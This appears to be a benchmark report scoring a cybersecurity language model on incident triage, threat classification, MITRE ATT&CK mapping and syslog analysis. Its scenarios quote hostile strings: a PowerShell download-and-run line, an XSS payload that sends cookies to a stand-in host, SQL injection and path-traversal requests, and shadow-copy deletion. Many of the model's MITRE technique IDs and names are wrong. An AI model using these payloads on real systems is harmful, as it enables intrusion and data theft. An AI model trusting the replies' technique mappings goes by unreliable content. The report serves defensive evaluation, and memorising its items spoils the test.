# Cybersecurity benchmark — `hf.co/segolilylabs/Lily-Cybersecurity-7B-v0.2-GGUF:Q4_K_M`
Model: `hf.co/segolilylabs/Lily-Cybersecurity-7B-v0.2-GGUF:Q4_K_M`
Run started: 2026-05-06 01:57:27

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 5 | 7 | 71% |
| Threat classification | 6 | 7 | 86% |
| MITRE ATT&CK mapping | 4 | 10 | 40% |
| Syslog triage (raw) | 7 | 8 | 88% |
| Syslog triage (drain3) | 1 | 8 | 12% |
| **Overall (with drain3)** | **16** | **32** | **50%** |

## Resource usage

Latency in seconds. GPU util/memory from `nvidia-smi`, CPU/RAM from `psutil`. Sampled every 250ms during each model call; peak is the max sample within the window.

| Section | n | Total s | Avg s | p50 s | p95 s | Max s | Peak GPU% | Avg GPU% | Peak GPU MB | Peak CPU% | Avg CPU% | Peak RAM MB |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| Incident | 7 | 4.6 | 0.65 | 0.30 | 0.35 | 2.87 | 79% | 65% | 18149 | 40% | 10% | 32556 |
| Threat | 7 | 4.6 | 0.66 | 0.71 | 0.81 | 0.94 | 92% | 84% | 17737 | 54% | 13% | 32549 |
| MITRE | 10 | 6.5 | 0.65 | 0.56 | 1.23 | 1.28 | 93% | 84% | 17737 | 52% | 16% | 32488 |
| Syslog (raw) | 8 | 2.2 | 0.27 | 0.28 | 0.32 | 0.33 | 89% | 73% | 17739 | 54% | 9% | 32515 |
| Syslog (drain3) | 8 | 1.1 | 0.13 | 0.11 | 0.12 | 0.30 | 89% | 75% | 17739 | 33% | 9% | 32514 |
| **Overall** | **40** | **18.9** | **0.47** | **0.32** | **1.23** | **2.87** | **93%** | **77%** | **18149** | **54%** | **12%** | **32556** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — FAIL (2.9s · GPU 53%/18149MB · CPU 12% · RAM 32553MB)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Answer: Incident. The user's IP address is not recognized as a common office location, indicating potential unauthorized access attempt.

### INC-2 — expected: **incident** — PASS (0.2s · GPU 53%/17735MB · CPU 7% · RAM 32522MB)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Answer: Incident. The unusual combination of factors suggests unauthorized access attempts.

### INC-3 — expected: **incident** — PASS (0.3s · GPU 79%/17737MB · CPU 8% · RAM 32548MB)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Answer: Incident. This volume of POST requests and the number of distinct IPs involved suggest an automated attack attempting to brute force admin accounts.

### INC-4 — expected: **benign** — FAIL (0.3s · GPU 79%/17737MB · CPU 6% · RAM 32529MB)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Reply: Incident. The large amount of data being transferred and the consistent exit code suggest an anomaly that requires further investigation.

### INC-5 — expected: **incident** — PASS (0.3s · GPU 79%/17737MB · CPU 40% · RAM 32539MB)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: Answer: Incident. The execution of powershell.exe by winword.exe and the subsequent downloading of a PowerShell script from an external IP address indicates potential malicious activity.

### INC-6 — expected: **benign** — PASS (0.3s · GPU 79%/17737MB · CPU 9% · RAM 32556MB)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Answer: Benign. The developer followed the established process and the unit tests passed, indicating no security vulnerabilities were introduced.

### INC-7 — expected: **incident** — PASS (0.3s · GPU 60%/17737MB · CPU 9% · RAM 32527MB)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: Answer: Incident. The volume and frequency of queries, combined with the large number of unique subdomains queried, suggest an unauthorized or malicious intent.

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (0.3s · GPU 60%/17737MB · CPU 7% · RAM 32527MB)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: Answer: Ransomware attack. The attacker encrypts files on user workstations and demands payment to restore access.

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (0.8s · GPU 92%/17737MB · CPU 7% · RAM 32549MB)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: Answer: Spear phishing with typosquatting. Spear phishing is a targeted email attack where the sender impersonates someone trusted to trick the recipient into taking an action they shouldn't. Typosquatting is when the attacker registers a domain name that looks similar to a legitimate one, but with a typo, in hopes of intercepting traffic meant for the real site. In this scenario, the attacker uses spear phishing to impersonate the CFO and then adds typosquatting to make their fake email address look more convincing.

_Match_: 'phishing'

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (0.9s · GPU 92%/17737MB · CPU 31% · RAM 32527MB)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: Answer: SQL injection.
SQL injection is a type of cyber attack where an attacker manipulates input fields in a web application to execute malicious SQL queries. In this scenario, the attacker injects an SQL query into the username field of the login form, which includes the comment '--' to bypass any potential input validation. The injected query attempts to exploit the vulnerability by using the OR operator and setting the condition to '1=1'. This technique allows the attacker to gain unauthorized access or manipulate the database. It is crucial for developers and security professionals to implement proper input validation, parameterized queries, and regular security assessments to prevent SQL injection attacks.

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (0.5s · GPU 85%/17737MB · CPU 12% · RAM 32528MB)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: Answer: Cross-site scripting (XSS).
This is an example of cross-site scripting (XSS) where an attacker injects malicious JavaScript code into a web application that reflects user input without proper encoding. This allows the attacker to execute arbitrary code on the victim's browser and potentially steal sensitive information like cookies.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (0.6s · GPU 92%/17737MB · CPU 14% · RAM 32532MB)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: Answer: Spear phishing with memory dumping. In this scenario, the internal user falls victim to a spear phishing attack where they unknowingly run an executable received via email. This executable then injects itself into lsass.exe, dumps the memory, and exfiltrates the dump over HTTPS to an external server. It's like a sneaky fishing expedition that targets specific individuals with malicious intent.

_Match_: 'lsass'

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (0.7s · GPU 92%/17737MB · CPU 13% · RAM 32517MB)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: Answer: Reflection Amplification Attack. This attack involves exploiting vulnerabilities in network devices to reflect and amplify traffic, overwhelming the targeted system with a flood of data. In this case, spoofed UDP packets are sent to the company's public DNS, causing a significant surge in traffic that can potentially disrupt or even crash the network infrastructure. It's crucial for cybersecurity professionals to identify and mitigate such attacks promptly to ensure the integrity and availability of the network.

_Match_: 'amplification'

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — FAIL (0.7s · GPU 92%/17737MB · CPU 54% · RAM 32478MB)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: Answer: Compromised build server, unauthorized software installation. In this scenario, the trusted third-party vendor's build server was compromised, leading to the installation of a backdoor on thousands of customer machines without authorization. This is an example of a compromised build server attack, where an unauthorized party gains access and manipulates the software development process to introduce malicious code or vulnerabilities into the final product. It highlights the importance of robust security measures to protect against such attacks and ensure the integrity of software updates.

## 3. MITRE ATT&CK technique mapping

**Per-case results**

| Case | Scenario | Accepted IDs | Detected | Result |
|---|---|---|---|---|
| ATT-1 | An attacker sends a Word document containing a malicious macro to a... | `T1566.001, T1566, T1204.002, T1204` | `T1192.001` | FAIL |
| ATT-2 | Adversary uses Mimikatz to extract plaintext passwords and NTLM has... | `T1003.001, T1003` | `T1003` | PASS |
| ATT-3 | Attacker creates a new scheduled task on the victim host to run the... | `T1053.005, T1053` | `T1059.002` | FAIL |
| ATT-4 | After initial access, the attacker uses 'net group "Domain Admins" ... | `T1087.002, T1087, T1018, T1482` | `T1087` | PASS |
| ATT-5 | Adversary establishes persistence by adding a value under HKCU\Soft... | `T1547.001, T1547` | `T1547` | PASS |
| ATT-6 | C2 beaconing traffic is encoded as DNS TXT record queries to attack... | `T1071.004, T1071, T1048.003, T1048` | `T1218.003` | FAIL |
| ATT-7 | Attacker uses PsExec from a compromised workstation to execute a re... | `T1021.002, T1021, T1570, T1569.002` | `T1021` | PASS |
| ATT-8 | Before encrypting victim files, the ransomware deletes Windows Volu... | `T1490` | `T1059.001` | FAIL |
| ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `T1087.002,T1087.002` | FAIL |
| ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `T1087.002` | FAIL |

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — FAIL (0.4s · GPU 92%/17737MB · CPU 12% · RAM 32463MB)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: Answer: The technique that best matches this behavior is "Macro Download" with the technique ID T1192.001. This technique involves an attacker using a macro within a document to download a payload onto the target system.

_Detected IDs_: T1192.001

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (0.5s · GPU 92%/17737MB · CPU 14% · RAM 32446MB)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: Answer: The technique that best matches this behavior is "Credential Access > Credential Dumping > T1003.002: OS Credential Dump". This technique involves extracting plaintext passwords and NTLM hashes from LSASS memory on a compromised host using Mimikatz.

_Detected IDs_: T1003

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (0.6s · GPU 93%/17737MB · CPU 49% · RAM 32444MB)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: Answer: The technique that best matches this behavior is T1059.002 - Scheduled Task / Scheduled Job. This technique involves creating a scheduled task or job on the victim's system to execute an implant every time it starts up. It allows the attacker to maintain persistence and continue their malicious activities even after rebooting the system.

_Detected IDs_: T1059.002

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — PASS (1.3s · GPU 93%/17737MB · CPU 36% · RAM 32458MB)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: Answer: The behavior described in the scenario can be associated with the following MITRE ATT&CK technique:

Technique ID: T1087.003
Technique Name: DCSync

Explanation: In this scenario, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment. This behavior aligns with the MITRE ATT&CK technique T1087.003, which is named DCSync. The purpose of this technique is to replicate Active Directory objects from a domain controller to gain unauthorized access or perform reconnaissance activities. By using these commands, the attacker aims to gather information about the AD environment and potentially escalate their privileges. It's crucial for cybersecurity professionals like yourself to be aware of such techniques and implement appropriate countermeasures to protect against them.

_Detected IDs_: T1087

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — PASS (0.3s · GPU 92%/17737MB · CPU 7% · RAM 32438MB)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: Answer: The technique that best matches this behavior is "Run Key Persistence" with the technique ID T1547.002.

_Detected IDs_: T1547

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — FAIL (0.6s · GPU 39%/17737MB · CPU 12% · RAM 32430MB)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: Answer: The technique that best matches this behavior is T1218.003, which is called "DNS TXT Record Channel (C2)." This technique involves encoding C2 beaconing traffic as DNS TXT record queries to bypass the proxy. It's a clever way for attackers to communicate with their command and control servers while evading detection.

_Detected IDs_: T1218.003

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — PASS (0.5s · GPU 92%/17737MB · CPU 52% · RAM 32447MB)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: Answer: The technique that best matches this behavior is "Remote Services: SMB/NetBIOS, RPC, LDAP, WinRM, WMI, PowerShell" with the technique ID T1021.003. This technique involves using remote services to execute commands on a target system, which aligns with the scenario provided.

_Detected IDs_: T1021

### ATT-8 — accepted IDs: ['T1490'] — FAIL (0.5s · GPU 92%/17737MB · CPU 31% · RAM 32470MB)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: Answer: The behavior of deleting Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet' can be matched to the MITRE ATT&CK technique named "Delete Shadow Copies" with the technique ID T1059.001.

_Detected IDs_: T1059.001

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — FAIL (1.2s · GPU 92%/17737MB · CPU 12% · RAM 32488MB)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: Answer: The behavior described in the scenario aligns with the following MITRE ATT&CK technique:

Technique ID: T1087.002
Technique Name: PowerShell, Base64 Encoded Command

Explanation: In this scenario, the binary employs base64-encoded PowerShell to conceal its true payload from defenders. This technique falls under the "PowerShell, Base64 Encoded Command" category of the MITRE ATT&CK framework (Technique ID: T1087.002). By encoding the command in base64, attackers can evade detection and analysis efforts, making it more challenging for defenders to uncover their true intentions. It's crucial for cybersecurity professionals like yourself to be aware of such techniques so that you can effectively counteract them and protect against potential threats.

_Detected IDs_: T1087.002,T1087.002

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — FAIL (0.6s · GPU 89%/17737MB · CPU 8% · RAM 32477MB)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: Answer: The technique that best matches this behavior is T1087.002, which is called "Compressing Data for Exfiltration." This technique involves compressing sensitive files into a password-protected RAR archive before exfiltrating them from the victim host. It falls under the category of data compression and archiving techniques used by attackers to evade detection and make it easier to transfer stolen information.

_Detected IDs_: T1087.002

## 4. Raw syslog triage (binary) — baseline vs drain3-augmented

### SYS-1 — SSH brute force followed by successful login — expected: **incident**
_Logs_:
```
Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2
Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2
Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2
Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2
Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2
Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2
Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2
Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2
Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

_drain3 templates_:
```
[x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2
[x2] Mar 10 <*> webhost <*> <*> password for ubuntu from 185.220.101.45 port <*> ssh2
[x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

**Baseline (raw only)** — PASS (0.3s · GPU 89%/17737MB · CPU 8% · RAM 32422MB)
_Reply_: Answer: Incident, multiple failed login attempts from the same IP address for various invalid usernames.

**With drain3 summary** — FAIL (0.1s · GPU 89%/17737MB · CPU 8% · RAM 32426MB)
_Reply_: 

### SYS-2 — Normal pubkey login from internal range — expected: **benign**
_Logs_:
```
Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

_drain3 templates_:
```
[x1] Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
[x1] Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
[x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

**Baseline (raw only)** — FAIL (0.3s · GPU 37%/17737MB · CPU 11% · RAM 32440MB)
_Reply_: Answer: Incident, This log entry indicates the successful authentication and acceptance of a public key for the user 'alice'. It suggests potential unauthorized access attempts.

**With drain3 summary** — FAIL (0.1s · GPU 37%/17737MB · CPU 6% · RAM 32402MB)
_Reply_: 

### SYS-3 — Daily cron run — expected: **benign**
_Logs_:
```
Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
[x1] Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
[x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

**Baseline (raw only)** — PASS (0.2s · GPU 37%/17737MB · CPU 7% · RAM 32401MB)
_Reply_: Answer: Benign, Cron jobs and rsyslogd are normal system activities.

**With drain3 summary** — PASS (0.3s · GPU 88%/17739MB · CPU 5% · RAM 32424MB)
_Reply_: Answer: Benign. The log lines are all part of routine cron jobs and rsyslogd restarts, which is expected behavior.

### SYS-4 — SQL injection probes in Apache access log — expected: **incident**
_Logs_:
```
185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4129
185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] "GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] "GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1" 200 4129
```

_drain3 templates_:
```
[x3] 185.62.190.13 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
[x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
```

**Baseline (raw only)** — PASS (0.2s · GPU 88%/17739MB · CPU 4% · RAM 32441MB)
_Reply_: Answer: Incident, The log entries indicate SQL injection attempts.

**With drain3 summary** — FAIL (0.1s · GPU 88%/17739MB · CPU 6% · RAM 32425MB)
_Reply_: 

### SYS-5 — Sudo adding service account to sudo group at 03:17 — expected: **incident**
_Logs_:
```
Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
[x1] Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
[x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

**Baseline (raw only)** — PASS (0.3s · GPU 88%/17739MB · CPU 4% · RAM 32468MB)
_Reply_: Answer: Incident, The logs indicate that the user bob has been granted sudo privileges, which is typically not done without proper authorization and should be considered a security incident.

**With drain3 summary** — FAIL (0.1s · GPU 88%/17739MB · CPU 6% · RAM 32492MB)
_Reply_: 

### SYS-6 — Path traversal probes in Apache access log — expected: **incident**
_Logs_:
```
198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841
198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 891
198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] "GET /download?file=....//....//etc/hosts HTTP/1.1" 200 412
```

_drain3 templates_:
```
[x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
```

**Baseline (raw only)** — PASS (0.3s · GPU 88%/17739MB · CPU 5% · RAM 32515MB)
_Reply_: Answer: Incident, The user is attempting to access sensitive files through directory traversal vulnerabilities in the web server.

**With drain3 summary** — FAIL (0.1s · GPU 79%/17739MB · CPU 33% · RAM 32514MB)
_Reply_: 

### SYS-7 — Normal authenticated web session — expected: **benign**
_Logs_:
```
10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] "GET /dashboard HTTP/1.1" 200 18421 "https://intranet.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "GET /static/app.js HTTP/1.1" 200 84219 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "POST /api/v1/metrics HTTP/1.1" 200 142 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

_drain3 templates_:
```
[x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

**Baseline (raw only)** — PASS (0.3s · GPU 79%/17739MB · CPU 54% · RAM 32488MB)
_Reply_: Answer: Benign, these logs indicate normal web browsing activities by the user Alice on the IP address 10.0.4.22.

**With drain3 summary** — FAIL (0.1s · GPU 79%/17739MB · CPU 6% · RAM 32467MB)
_Reply_: 

### SYS-8 — Windows 4625 burst then 4624 from same IP — expected: **incident**
_Logs_:
```
Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

_drain3 templates_:
```
[x5] Mar 10 <*> dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
[x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

**Baseline (raw only)** — PASS (0.2s · GPU 79%/17739MB · CPU 6% · RAM 32483MB)
_Reply_: Answer: Incident, Multiple failed login attempts indicate potential unauthorized access attempt.

**With drain3 summary** — FAIL (0.1s · GPU 79%/17739MB · CPU 7% · RAM 32493MB)
_Reply_: 
